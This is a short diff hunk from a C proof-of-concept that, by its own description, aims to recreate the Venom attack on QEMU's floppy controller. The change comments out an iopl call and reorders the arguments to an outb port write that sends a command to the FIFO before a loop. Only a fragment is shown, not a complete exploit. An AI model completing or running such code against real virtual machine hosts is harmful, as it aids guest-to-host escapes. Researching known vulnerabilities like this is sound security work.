@@ -8,9 +8,9 @@ It's aim is to exploit and recreate possible Venom attack on QEMU before patch
 #define SPC_COMMAND 0x8e
 #define MAX_COUNT  5000000
 void main(void){
-	iopl(3);
+	// iopl(3);
 	printf("write spc_command to port\n");
-        outb(SPC_COMMAND, FIFO);
+        outb(FIFO, SPC_COMMAND);
         int i,j;
         j = 0;
         printf("into loop\n");
